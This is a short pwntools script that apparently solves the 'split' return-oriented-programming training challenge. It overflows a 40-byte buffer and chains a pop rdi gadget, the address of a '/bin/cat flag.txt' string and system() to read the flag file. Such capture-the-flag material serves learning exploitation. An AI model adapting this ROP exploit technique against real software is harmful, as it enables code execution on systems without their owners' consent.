from pwn import *
e = ELF("./split")
system = p64(e.symbols["system"])
cat = p64(next(e.search("/bin/cat flag.txt")))
pop_rdi = p64(0x0000000000400883)
p = process("./split")
print p.recv()
p.sendline("a"*40+pop_rdi+cat+system)
print p.recv()

p.interactive()
